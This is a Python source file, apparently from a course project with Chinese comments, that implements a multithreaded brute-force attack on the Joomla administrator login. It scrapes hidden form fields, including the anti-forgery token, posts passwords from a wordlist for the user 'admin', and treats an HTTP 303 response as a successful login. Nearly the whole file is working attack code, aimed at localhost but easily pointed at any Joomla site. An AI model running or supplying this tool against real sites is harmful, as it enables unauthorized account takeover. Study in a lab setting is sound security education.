#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/26 13:59 
# @Author   : ordar
# @File     : http_joomla_form_brute.py
# @Project  : pythonCourse
# @Python   : 3.7.5
import queue
import threading
import requests
from bs4 import BeautifulSoup


user_thread = 5
resume = None
# 设置目标地址,要解析HTML的页面和要尝试暴力破解的位置。
target_index_url = "http://localhost/joomla/administrator/index.php"
target_post_url = "http://localhost/joomla/administrator/index.php"
# 对应的HTML元素
usernmae_field = "username"
password_field = "passwd"
# 检测每一次暴力破解提交的用户名和密码是否登录成功
# 如果响应码为303代表密码正确
success_check = 303
# proxy = {"http": "http://127.0.0.1:8888"}


class Bruter:
    def __init__(self, username, words):
        self.username = username
        self.passwords = words
        self.found = False
        print("Finished setting up for: {}".format(username))

    def web_brute(self):
        while not self.passwords.empty() and not self.found:
            brute = self.passwords.get().strip()
            resp = requests.get(target_index_url)
            cookies = resp.cookies.get_dict()
            text = resp.text
            # post提交的表单数据
            all_post_data = {}
            all_post_data[usernmae_field] = self.username
            all_post_data[password_field] = brute
            print("[-] Trying: {}:{}".format(self.username, brute))
            # 使用BeautifulSoup解析html，取出所有的input。然后遍历，取出name和value,再追加到all_post_data里面
            soup = BeautifulSoup(text, "xml")
            all_input = soup.find_all("input")
            for i in all_input:
                # print(i, i['name'])
                if i['name'] != usernmae_field and i['name'] != password_field:
                    # print(i['name'], i['value'])
                    all_post_data[i['name']] = i['value']

            # 提交post表单，data是表单，cookies是携带的cookie，
            # allow_redirects禁止重定向
            resp_post = requests.post(target_post_url, data=all_post_data, cookies=cookies, allow_redirects=False)
            if success_check == resp_post.status_code:
                self.found = True
                print("[*] Brute successful.")
                print('[*] Username:{}'.format(self.username))
                print('[*] Passwd:{}'.format(brute))
                print("[*] Waiting other thread stop")

    def run_brute(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_brute)
            t.start()


# 构建字典队列。
def build_wordlist(wordlist_file):
    """
    读入一个字典文件，然后开始对文件中的每一行进行迭代。
    如果网络连接突然断开或者目标网站中断运行，则我们设置的一些内置函数可以让我们恢复暴力破解会话。
    这可以通过让resume变量接上中断前最后一个尝试暴力破解的路径来轻松实现。
    整个字典文件探测完毕后，返回一个带有全部字符的Queue对象，将在实际的暴力破解函数中使用。
    :param wordlist_file:字典文件
    :return:返回一个带有全部字符的Queue对象
    """
    # 读入字典文件
    with open(wordlist_file, 'r') as f:
        raw_words = f.readlines()
    found_resume = False
    words = queue.Queue()
    # 对字典每一行进行迭代
    for word in raw_words:
        word = word.strip()
        # 判断断点：
        # 如果断点存在就从断点后面开始构建字典队列
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: {}".format(resume))
        else:
            # 没有断点从一开始就构建字典队列
            words.put(word)
    return words


if __name__ == '__main__':
    username = "admin"
    wordlist_file = "wordlist.txt"
    wordlist_queue = build_wordlist(wordlist_file)
    bruter = Bruter(username, wordlist_queue)
    bruter.run_brute()
